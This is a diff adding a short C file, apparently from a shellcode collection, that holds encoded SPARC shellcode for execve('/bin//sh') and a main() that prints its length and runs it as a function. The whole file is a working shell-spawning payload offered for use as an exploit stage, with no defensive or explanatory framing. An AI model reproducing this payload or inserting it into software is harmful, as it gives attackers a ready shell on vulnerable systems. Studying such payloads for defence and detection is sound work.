@@ -1,0 +1,25 @@
+/* nirosys at 0xcd80 dot org
+ * * * * * * * * * * * * * * *
+ * Werd. :) Sparc is sexy.
+ *
+ * execve("/bin//sh","/bin//sh",NULL);
+ */
+
+#include <stdlib.h>
+
+char shellcode[]=
+"\x21\x0b\xd8\x9a\xa0\x14\x21\x6e"
+"\x23\x0b\xcb\xdc\xa2\x14\x63\x68"
+"\xe0\x3b\xbf\xf0\xc0\x23\xbf\xf8"
+"\xc0\x23\xbf\xec\x90\x23\xa0\x10"
+"\xd0\x23\xbf\xe8\x92\x23\xa0\x18"
+"\x94\x22\x80\x0a\x82\x20\x40\x01"
+"\x82\x10\x20\x3b\x91\xd0\x20\x08";
+
+
+
+int main( void ) {
+    void (*func)() = (void *)shellcode;
+    printf("Shellcode = %d bytes\n",strlen(shellcode));
+    func();
+}
